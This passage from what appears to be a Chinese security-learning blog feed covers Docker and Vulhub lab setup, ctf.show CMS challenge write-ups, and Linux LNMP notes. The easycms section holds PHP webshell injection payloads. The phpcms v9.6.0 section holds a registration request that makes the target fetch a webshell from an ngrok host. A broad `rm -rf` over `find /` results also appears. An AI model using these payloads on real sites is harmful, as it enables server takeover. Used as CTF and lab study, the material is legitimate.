docker-engine</code></pre><p>安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p><pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre><p>设置yum源</p><pre><code>yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</code></pre><p>可以查看所有仓库中所有docker版本，并选择特定版本安装</p><pre><code>yum list docker-ce --showduplicates | sort -r</code></pre><p>安装docker</p><pre><code>yum install docker-ce  #由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0执行上面的命令是默认安装，下面这条命令就不用执行了yum install &lt;FQPN&gt;  # 例如：sudo yum install docker-ce-17.12.0.ce</code></pre><p>启动并加入开机启动</p><pre><code>systemctl start dockersystemctl enable docker</code></pre><p>验证安装是否成功(有client和service两部分表示docker安装启动都成功了)</p><pre><code>docker version</code></pre><h4 id="docker容器中下载weblogic12c（可略过不看）"><a href="#docker容器中下载weblogic12c（可略过不看）" class="headerlink" title="docker容器中下载weblogic12c（可略过不看）"></a>docker容器中下载weblogic12c（可略过不看）</h4><ul><li>获取镜像</li></ul><pre><code>docker pull ismaleiva90/weblogic12//docker pull #获取镜像//ismaleiva90/weblogic #weblogic的镜像，后面没有指定镜像版本就会获取默认的 latest版本</code></pre><ul><li>生成并启动容器</li></ul><pre><code>docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest//docker run    #启动//-d    #使得容器后台运行//-p   #指定端口号//ismaleiva90/weblogic：latest  #镜像的详细信息//2018/3/6 启动命令： docker run -d -p 7001:7001 -p 7002:7002 --restart=always //ismaleiva90/weblogic12:latest//启动命令更改之后，访问端口变为 7001，  http://172.17.0.1:7001/consoledocker run -d -p 7001:7001 -p 7002:7002 --restart=always ismaleiva90/weblogic12:latest</code></pre><ul><li>在浏览器中访问weblogic<a href="http://172.17.0.1:49163/console">http://172.17.0.1:49163/console</a></li></ul><pre><code>172.150.19.40  #当前主机的ip地址49163 #访问端口号访问结果，出现登录页面</code></pre><ul><li>登录账号和密码：</li></ul><pre><code>用户名：  weblogic密码：    welcome1</code></pre><h4 id="docker容器中下载vulhub漏洞环境"><a href="#docker容器中下载vulhub漏洞环境" class="headerlink" title="docker容器中下载vulhub漏洞环境"></a>docker容器中下载vulhub漏洞环境</h4><p>docker-compose 的安装及使用</p><p>Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。使用 Docker Compose 不再需要使用 shell 脚本来启动容器。(通过 docker-compose.yml 配置)</p><p>安装</p><p>可以通过修改 URL 中的版本，自定义您需要的版本。</p><pre><code>sudo curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose</code></pre><p>卸载</p><pre><code>sudo rm /usr/local/bin/docker-compose</code></pre><h4 id="正式下载漏洞环境Vulhub"><a href="#正式下载漏洞环境Vulhub" class="headerlink" title="正式下载漏洞环境Vulhub"></a>正式下载漏洞环境Vulhub</h4><p>下载docker漏洞环境：Vulhub</p><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><p>搭建漏洞环境</p><pre><code> git clone https://github.com/vulhub/vulhub.git https://github.com/vulhub/vulhub/archive/master.zip   //直接下载地址</code></pre><p>改一下国内镜像</p><pre><code>vim /etc/docker/daemon.json添加&#123;    &quot;registry-mirrors&quot;: [&quot;https://nfesww3w.mirror.aliyuncs.com&quot;]&#125;</code></pre><p>输入命令，重启docker即可</p><pre><code class="php">systemctl daemon-reloadsystemctl restart docker</code></pre><p>进入&#x2F;root&#x2F;vulhub&#x2F;struts2&#x2F;s2-001目录</p><pre><code>docker-compose up -d //安装此漏洞环境docker ps //查看运行服务端口</code></pre><p>访问ip:port即可看到web网页</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271330427.png"></p><pre><code>docker-compose down //测试完毕之后，使用此命令即可结束服务，使环境变为初始状态。</code></pre><p>测试payload</p><pre><code>%&#123;1+1&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271804744.png" alt="image-20220327180450692"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271804611.png" alt="image-20220327180459579"></p><p>这次我们试一试命令执行，new java.lang.String[ {“cat”,”&#x2F;etc&#x2F;passwd”} 在这里更改我们想要执行的命令。</p><p>&#96;&#96;&#96;<br>%</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS</title>
      <link href="/ctfshow/ctf.show/CMS/"/>
      <url>/ctfshow/ctf.show/CMS/</url>
      
        <content type="html"><![CDATA[<h1 id="web477"><a href="#web477" class="headerlink" title="web477"></a>web477</h1><p>题目提示rce</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292008555.png" alt="image-20220329200851338"></p><p>是easycms的</p><p>去网站搜搜,搜到后台地址是admin.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292029840.png" alt="image-20220329202954637"></p><p>弱口令admin admin登进去了</p><p>网上查了一下是5.7的版本,然后找一下漏洞</p><p>漏洞文件位置：&#x2F;lib&#x2F;table&#x2F;table_templatetagwap.php 第3-20行：</p><pre><code class="php"> class table_templatetag extends table_mode &#123;       function vaild() &#123;    if(!front::post(&#39;name&#39;)) &#123;               front::flash(&#39;请填写名称！&#39;);    return false;           &#125;    if(!front::post(&#39;tagcontent&#39;)) &#123;               front::flash(&#39;请填写内容！&#39;);    return false;          &#125;   return true;      &#125;      function save_before() &#123;   if(!front::post(&#39;tagfrom&#39;)) front::$post[&#39;tagfrom&#39;]=&#39;define&#39;;   if(!front::post(&#39;attr1&#39;)) front::$post[&#39;attr1&#39;]=&#39;0&#39;;   if(front::$post[&#39;tagcontent&#39;]) front::$post[&#39;tagcontent&#39;] =         htmlspecialchars_decode(front::$post[&#39;tagcontent&#39;]);    &#125;  &#125;  </code></pre><p>可以看到在写入文件之前,使用htmlsprcialchars_decode函数把预定义的html实体”&lt;”和”&gt;”大于转换为字符,因此我们可以使用双引号闭合,从而构造出payload写入文件,进一步触发代码,导致程序在现实上存在代码执行漏洞,攻击者可以通过构造恶意脚本代码写入配置文件,从而执行命令,控制网站服务器权限.</p><p>利用</p><ol><li>登录后台,模板-自定义标签-添加自定义标签-填写payload-提交</li></ol><pre><code>111&quot;;&lt;?php phpinfo()?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292048605.png" alt="image-20220329204815544"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292050326.png" alt="image-20220329205020283"></p><p>​    2.保存提交后,点击预览,成功触发代码,或者查看id的值,然后直接访问文件路径:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292050708.png" alt="image-20220329205040655"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292054883.png" alt="image-20220329205402855"></p><p>​    3.使用别人的绕过过滤的一句话木马</p><pre><code>11&quot;;&#125;&lt;?php assert($_POST[zf]);?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292118216.png" alt="image-20220329211842180"></p><p>但是发现连不上,可能存在过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292121539.png" alt="image-20220329212120484"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292121035.png" alt="image-20220329212134989"></p><p>上传一般一句话木马的时候有过滤,在phpinfo页面curl + f 查找下flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292114380.png" alt="image-20220329211453351"></p><h1 id="web478"><a href="#web478" class="headerlink" title="web478"></a>web478</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312048610.png" alt="image-20220331204835567"></p><p>这里有提示安装地址哦</p><pre><code>http://5a4353d3-1ab1-481f-87af-ff6ce895dd9b.challenge.ctf.show/install/install.php</code></pre><p>phpcms v9</p><p>看看有没有逻辑漏洞</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312050348.png" alt="image-20220331205003246"></p><p>php版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312052714.png" alt="image-20220331205222577"></p><p>几个可写路径</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312054059.png" alt="image-20220331205423918"></p><p>填上数据库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312055688.png" alt="image-20220331205531591"></p><p>后台</p><p>cms的具体版本Phpcms V9.6.0  </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312057028.png" alt="image-20220331205659917"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312057774.png" alt="image-20220331205733703"></p><p>就是你了</p><p>这里需要一个公网ip,我没有,这里使用代理工具<a href="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz">ngrok</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312127649.png" alt="image-20220331212735598"></p><p>解压</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312127719.png" alt="image-20220331212749649"></p><p>加一下这里的授权码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312128326.png" alt="image-20220331212816253"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129602.png" alt="image-20220331212903542"></p><p>开启代理<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129483.png" alt="image-20220331212948427"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312129493.png" alt="image-20220331212935334"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312140528.png" alt="image-20220331214003493"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312139971.png" alt="image-20220331213950913"></p><p>编辑一个txt文件在web服务中,并写入一句话木马</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312141563.png" alt="image-20220331214108522"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312143073.png" alt="image-20220331214334988"></p><p>注册的时候抓包,将这个下面构造的放到info后面</p><pre><code>siteid=1&amp;modelid=11&amp;username=test2&amp;password=test2123&amp;email=test2@163.com&amp;info[content]=&lt;img src=http://5edc-112-38-217-12.ngrok.io/wanan.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</code></pre><p>把这个替换一下,测试直接发送burp抓到的是没办法执行的,鬼知道什么原因,等我有时间了在分析,反正就是该删的删</p><pre><code>&lt;img src=http://5edc-112-38-217-12.ngrok.io/wanan.txt?.php#.jpg&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312155553.png" alt="image-20220331215513458"></p><p>回显了一个php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156906.png" alt="image-20220331215625769"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156006.png" alt="image-20220331215641929"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312156521.png" alt="image-20220331215658454"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux操作学习(六)</title>
      <link href="/Linux/Linux/Linxe-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%85%AD)/"/>
      <url>/Linux/Linux/Linxe-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%85%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="linux操作学习-六"><a href="#linux操作学习-六" class="headerlink" title="linux操作学习(六)"></a>linux操作学习(六)</h1><h2 id="配置软件仓库"><a href="#配置软件仓库" class="headerlink" title="配置软件仓库"></a>配置软件仓库</h2><p>软件仓库是一种能进一步简化RPM管理软件的难度以及自动分析所需软件包及其依赖关系的技术。可以把Yum或DNF想象成是一个硕大的软件仓库，里面保存有几乎所有常用的工具，而且只需要说出所需的软件包名称，系统就会自动为您搞定一切。</p><p>既然要使用软件仓库，就要先把它搭建起来，然后将其配置规则确定好才行。</p><p>Yum与DNF软件仓库的配置文件是通用的，也就是说填写好配置文件信息后，这两个软件仓库的命令都是可以正常使用</p><ol><li>进入&#x2F;etc&#x2F;yum.repos.d&#x2F;目录中(因为该目录存放着软件仓库的配置文件)</li><li>使用vim编辑器创建一个名为centos.repo的新配置文件(文件名随意,但是后缀必须为.repo)逐项写入下面的配置参数并保存退出.<ul><li>仓库名称:具有唯一性的标识名称,不应与其他软件仓库发生冲突</li><li>描述信息(name):可以是一些介绍性的词,可以使用FTP或者HTTP下载,也可以是本地文件(需要在后面添加file参数)</li><li>是否启用(enabled):设置此源是否可用;1为可用,0为禁用</li><li>是否校验(gbgcheck):设置此源是否校验文件;1为校验,0为不校验</li><li>公钥位置(gbgkey):若上面的参数开启了校验功能,则此处为公钥文件位置.若没有开启,则省略不写</li></ul></li><li>按照配置参数中所填写的仓库位置挂载光盘,并把光盘挂载信息写入&#x2F;etc&#x2F;fstab文件中</li><li>使用”dnf install httpd -y”命令检查软件仓库是否已经可用</li></ol><p>安装httpd(可能不对)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241648905.png" alt="image-20220324164851853"></p><p>启动httpd服务程序并将其加入到开机启动项中,使其能够随着系统的开机而运行,从而持续为用户提供web服务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241650775.png" alt="image-20220324165010728"></p><p>打开浏览器访问80端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241656492.png" alt="image-20220324165601382"></p><h3 id="配置服务文件参数"><a href="#配置服务文件参数" class="headerlink" title="配置服务文件参数"></a>配置服务文件参数</h3><p>在linux系统中配置服务,其实就是在修改服务的配置文件.因此还需要知道这些配置文件的所在位置及其用途.</p><p> Linux系统中的配置文件</p><table><thead><tr><th>作用</th><th>文件名称</th></tr></thead><tbody><tr><td>服务目录</td><td>&#x2F;etc&#x2F;httpd</td></tr><tr><td>主配置文件</td><td>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td></tr><tr><td>网站数据目录</td><td>&#x2F;var&#x2F;www&#x2F;html</td></tr><tr><td>访问日志</td><td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</td></tr><tr><td>错误日志</td><td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</td></tr></tbody></table><p>主配置文件中保存的是最重要的服务参数,一般会被保存到&#x2F;etc目录中以软件名称命名的一个文件夹中,名字为”服务名称.cong”,例如治理的”&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf”</p><p>打开配置文件,所有以(#)开始的行都是注释行,其目的是对httpd服务程序的功能或者某一行参数进行介绍.</p><p>在httpd服务程序的主配置文件中,存在三种类型的信息:注释行信息 全局配置 区域配置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241703413.png" alt="image-20220324170318342"></p><p>全局配置参数就是一种全局性的配置参数,可以用作于所有的子站点,即保证了子站点的正常访问,也有效降低了频繁写入重复参数的工作量.区域配置参数则是单独针对没做独立的子站点进行设置的.</p><p>  配置httpd服务程序时最常用的参数以及用途描述</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>ServerRoot</td><td>服务目录</td></tr><tr><td>ServerAdmin</td><td>管理员邮箱</td></tr><tr><td>User</td><td>运行服务的用户</td></tr><tr><td>Group</td><td>运行服务的用户组</td></tr><tr><td>ServerName</td><td>网站服务器的域名</td></tr><tr><td>DocumentRoot</td><td>网站数据目录</td></tr><tr><td>Listen</td><td>监听的IP地址与端口号</td></tr><tr><td>DirectoryIndex</td><td>默认的索引页页面</td></tr><tr><td>ErrorLog</td><td>错误日志文件</td></tr><tr><td>CustomLog</td><td>访问日志文件</td></tr><tr><td>Timeout</td><td>网页超时时间，默认为300秒</td></tr></tbody></table><p>DocumentRoot参数用于定义网站数据的保存路径,其参数的默认值是&#x2F;var&#x2F;www&#x2F;html(即把网站数据存放到这个目录中);而当前网站普通的首页面名称是index.html,因此可以向&#x2F;var&#x2F;www&#x2F;html&#x2F;index.html文件中写入一段内容,替换掉httpd服务程序的默认首页.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241737421.png" alt="image-20220324173710373"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241737073.png" alt="image-20220324173720024"></p><p>在默认情况下,网站数据保存在&#x2F;var&#x2F;www&#x2F;html目录中,如果想把保存网站数据的目录修改为&#x2F;home&#x2F;wwwroot目录</p><ol><li><p>创建网站数据的保存目录,并创建首页文件</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241740246.png"></p></li><li><p>打开httpd服务程序的主配置文件,将用于定义网站数据保存路径参数DocumentRoot修改为&#x2F;home&#x2F;wwwroot,同时还需要将用于定义目录权限的参数Directory后面的路径也修改为&#x2F;home&#x2F;wwwroot.配置文件修改完毕之后即可保存并退出<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241749069.png" alt="image-20220324174919017"></p></li><li><p>重新启动httpd服务程序并验证效果<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241751106.png" alt="image-20220324175153057"></p></li></ol><h1 id="使用LNMP架构部署动态网站环境"><a href="#使用LNMP架构部署动态网站环境" class="headerlink" title="使用LNMP架构部署动态网站环境"></a>使用LNMP架构部署动态网站环境</h1><h2 id="源码包程序"><a href="#源码包程序" class="headerlink" title="源码包程序"></a>源码包程序</h2><p>源码包的可移植性非常好，几乎可以在任何Linux系统中安装使用，而RPM软件包是针对特定系统和架构编写的指令集，必须严格地符合执行环境才能顺利安装（即只会去“生硬地”安装服务程序）。</p><p>使用源码包安装服务程序时会有一个编译过程，因此能够更好地适应安装主机的系统环境，运行效率和优化程度都会强于使用RPM软件包安装的服务程序。也就是说，可以将采用源码包安装服务程序的方式看作是针对系统的“量体裁衣”</p><ol><li>下载及解压源码包文件,为了方便在网络中传输,源码包文件通常会在归档后使用gzip或者bzip2等格式进行压缩,因此一般会就要.tar.gz或者.tar.bz2的后缀,想要使用源码包安装服务程序,必须先把里面的内容解压出来,然后再切换到源码包文件的目录中<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241812207.png" alt="image-20220324181257153"></li><li>编译源码包代码,在正式使用源码包安装服务程序之前,还需要使用编译脚本针对当前系统进行一系列的评估工作,包括对源码包文件 软件之间及函数库之间的依赖关系 编译器 汇编器及链接器进行检查.我们还可以根据需要来追加 –prefix参数,以指定稍后的源码包程序的安装路径,从而对服务程序的安装过程更加可控.当编译工作结束之后,如果系统环境符合安装要求,一般会自动在当前目录下生成一个makefile安全文件<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241817179.png" alt="image-20220324181733125"></li><li>生成二进制安装程序,刚生成的Makefile文件中会保存与系统环境 软件依赖关机和安装规则等相关的内容,接下来便可以使用make命令来根据Makefile 文件内容提供的合适规则编译生成出真正可以提供给用户安装服务程序的二进制可执行文件了<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241820045.png" alt="image-20220324182005993"></li><li>运行二进制的服务程序安装包 由于不需要在简称系统环境,也就不需要在编译源码 ,因此运行二进制的服务程序安装包应该速度最快的步骤.如果在源码包编译阶段使用了 –prefix参数,那么此时服务程序就会被安装到那个目;如果没有自行使用参数定义目录的话,一般会被默认安装到&#x2F;usr&#x2F;local&#x2F;bin目录<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241822094.png" alt="image-20220324182246043"></li><li>清理源码包临时文件,由于在安装服务程序的过程中进行了代码编译的工作,因此在安装后目录中会遗留下很多历史垃圾文件,本着尽量不要浪费磁盘存储空间的原则,可以使用make clean命令对临时文件进行彻底的清理<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241824265.png" alt="image-20220324182452218"></li></ol><h2 id="LNMP动态网站架构"><a href="#LNMP动态网站架构" class="headerlink" title="LNMP动态网站架构"></a>LNMP动态网站架构</h2><p>LNMP动态网站部署架构是一套有linux + Nginx + MySQL + PHP组成的动态网站解决方案.LNMP中的字母L是linux系统的意思.</p><p>在使用源码包安装服务的时候需要先让安装主机具备编译程序源码的环境,这需要具备c语言 c++语言 perl语言的编译器,以及支持常见的编译支持数据库程序,因此配置软件仓库</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251254767.png" alt="image-20220325125441652"></p><p>接着还需要从外部网络来获取Nginx MySQL PHP 及WordPress等一系列的安装包.因此需要配置虚拟机使链接到互联网</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251256152.png" alt="image-20220325125649099"></p><p>可以直接使用wget命令下载这些源码包文件.这里将其放到lnmp目录下保存</p><pre><code>[root@linuxprobe ~]# mkdir /lnmp[root@linuxprobe ~]# cd /lnmp[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/rpcsvc-proto-1.4.tar.gz[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/nginx-1.16.0.tar.gz[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/mysql-8.0.18.tar.xz[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/php-7.3.5.tar.gz[root@linuxprobe lnmp]# wget https://www.linuxprobe.com/Software/wordpress.tar.gz[root@linuxprobe lnmp]# lsrpcsvc-proto-1.4.tar.gz       nginx-1.16.0.tar.gz   mysql-8.0.18.tar.xzphp-7.3.5.tar.gz              wordpress.tar.gz</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251303390.png" alt="image-20220325130303343"></p><p>rpcsvc-proto是一款包含rcpsvc协议文件的支持软件包名称.rcpsvc协议在或许nginx与mysql服务程序的部署过重中都需要被调用到.想要通过源码包安装服务程序,就一定要严格遵循上面的安装步骤,下载及解压源码包文件 编译源码包代码 生成二进制安装程序 运行二进制的服务程序安装包.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251305930.png" alt="image-20220325130504871"></p><h3 id="配置nginx服务"><a href="#配置nginx服务" class="headerlink" title="配置nginx服务"></a>配置nginx服务</h3><p>nginx服务是一款优秀的部署动态网站的轻量级服务程序</p><ol><li><p>创建用于管理网站服务的系统账户,这次在新建账户时应使用-M参数不创建对应的家目录,以及使用-s参数指定登录后的shell解释器为&#x2F;sbin&#x2F;nologin,确保任何人不能通过这个账号登录主机<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251309674.png" alt="image-20220325130948624"></p></li><li><p>编译nginx网站服务程序,为了能够让网站服务支持更多的功能,需要在编译过程中添加二外的参数,其中较为重要的是使用prefix参数指定服务将被安装到那个目录,方便后面找到和调用它,其次,考虑到https协议使用越来越广泛,索引这里用with-http_ssl_module参数来开启nginx服务的ssl加密模块,以便以后开启https协议功能<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251314499.png" alt="image-20220325131441444"></p><p> 相对来说,编译脚本文件(configure)比生成二进制文件(make)要快,而安装程序(make install)则是最快的,它相当于以双击的方式运行二进制安装包,在编译 生成和安装三个阶段中,屏幕上会输出各式各样的信息,主要包含软件包的概要情况,当前系统的软件依赖关系,以及是否有条件及进行安装操作,但只要进程没有被强行终止,或是没有输出明显的报错信息,则都是正常情况.</p></li><li><p>安装完成后进入最终配置阶段,既然在编译环境中使用prefix参数指定了安装路径,那么nginx服务程序的配置文件一定在&#x2F;user&#x2F;local&#x2F;nginx目录中</p><p> 接下来修改&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf文件的第二行注释删除,然后再后面写上负责运行网站服务程序的账户名称和用户组名称,这里的就是由nginx用户及nginx用户组负责管理网站服务<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251325912.png" alt="image-20220325132523860"></p><p> 接着修改第45行的首页面文件名称,在里面添加index.php的文件.这个文件也是让用户浏览网站时第一眼看到的文件,也叫首页文件</p><p> 最后在删除65~71行前面的注释符#来启用虚拟主机功能,然后将第69行后面对应的网站根目录修改为&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html,其中的fastcgi_script_name参数用于指代脚本名称,也就是用户请求的url.只有想你想填写正确了,才能使nginx服务正确解析用户请求,否则访问的页面会提示 “404 Not Found”错误</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251332618.png" alt="image-20220325133221548"></p></li><li><p>通过编译源码的方式安装的服务默认不能被systemctl命令所管理,而要使用nginx服务本身的管理工具进行操作,相应命令所在的目录时&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin.由于使用绝对路径的形式输入命令未免会太麻烦,建议将&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin路径添加到PATH变量中,让bash解释器在后续执行命令时自动搜索到他,然后再source命令后加载配置文件,让参数立即生效.下来就只需要输入nginx命令即可启动网站服务了<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251338392.png" alt="image-20220325133834331"></p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251341542.png" alt="image-20220325134140481"></p></li></ol><h3 id="配置mysql服务"><a href="#配置mysql服务" class="headerlink" title="配置mysql服务"></a>配置mysql服务</h3><p>在使用软件仓库安装服务程序时,系统会自动根据RPM软件包中的指令集完成软件配置等工作,但是一旦选择使用源码包的方式来安装,这一切就需要自己来完成了.对于mysql数据库来说,我们需要在系统中创建一个mysql的用户,专门用于负责运行mysql数据库.要记住将这类用户的bash终端设置成nologin解释器</p><p>准备配置mysql服务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251346865.png" alt="image-20220325134631818"></p><ol><li><p>解压mysql安装软件包,将解压出来的程序目录改名并移动到&#x2F;usr&#x2F;local目录下,对其进行初始化操作后便可使用,要注意的是以.tar.xz结尾的压缩包软件,不应用z参数进行解压<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251350791.png" alt="image-20220325135022743"></p></li><li><p>在生产环境中管理mysql数据库是,有两个比较常用的目录,一个是&#x2F;usr&#x2F;local&#x2F;mysql目录,这里用于保存mysql数据库程序文件的路径.还有一个就是&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data目录,他用于存储数据库的具体内容,每个数据库的内容会被单独存放到一个目录内.对于实际数据库文件的data目录,用户需要先手动创建出来<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251354477.png" alt="image-20220325135436430"></p></li><li><p>初始化mysql服务程序,对目录进行授权,确保数据能够被mysql系统用户读取,在初始化阶段,应使用mysqld命令确认管理mysql数据库服务的用户名称 数据保存目录 及编码信息,在信息确认无误后开始进行初始化.在初始化最后阶段,系统会给用户分配一个初始化的临时密码(w+an-r3kGpuD)<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251358960.png" alt="image-20220325135815903"></p></li><li><p>与nginx服务相似,mysql数据库的二进制可执行命令也单独存放在自身的程序目录&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin中.若每次在执行命令之前都要切换到这个目录,则有些麻烦,要加入到PATH变量中<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251402211.png" alt="image-20220325140200150"></p><p> 在这样设置之后,几遍返回到源码目录.也可以继续执行mysql数据库的管理命令.接着将启动脚本mysql.server放入带&#x2F;etc&#x2F;init.d目录中,让服务器每次重启后都能自动启动数据库,并给予可执行权限</p><p> libtinfo.so.5文件是mysql数据库在8.0版本后新添加的重要函数库文件,但默认不存在,需要将libtinfo.so.6.1文件复制过来或者作为链接文件才能正常启动<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251409442.png" alt="image-20220325140912391"></p></li><li><p>执行mysql数据库服务启动文件,并进行初始化工作,为了安全,mysql自8.0版本起不在允许用户使用临时密码来管理数据库内容,也不能进行远程控制,用户必须修改初始化密码后才能使用mysql数据库.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251431843.png" alt="image-20220325143136787"></p><p> 出现报错信息</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251433086.png" alt="image-20220325143301039"></p><p> 检查系统是否安装过mysql。</p><pre><code>rpm格式安装的mysql卸载方式rpm -qa|grep -i mysqlrpm -e mysql-5.1.47-4.el6.x86_64 –nodeps说明：-e参数表示删除 –nodeps表示不校验依赖关系主要卸载内容一般包括以下包mysql-5.1.47-4.el6.x86_64mysql-connector-odbc-5.1.5r1144-7.el6.x86_64mysql-libs-5.1.47-4.el6.x86_64mysql-devel-5.1.47-4.el6.x86_64mysql-server-5.1.47-4.el6.x86_64二进制包格式安装的mysql卸载#停掉mysqlservice mysql stop#查看状态service mysql statusrm -rf `find / -name mysql`</code></pre><p> 之后重新安装<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251549533.png" alt="image-20220325154904459"></p><p> 但是这样还不行,需要切换到mysql数据库中,修改user表单的密码值<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251554322.png" alt="image-20220325155418264"></p><p> 先建立一个数据库<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251555995.png" 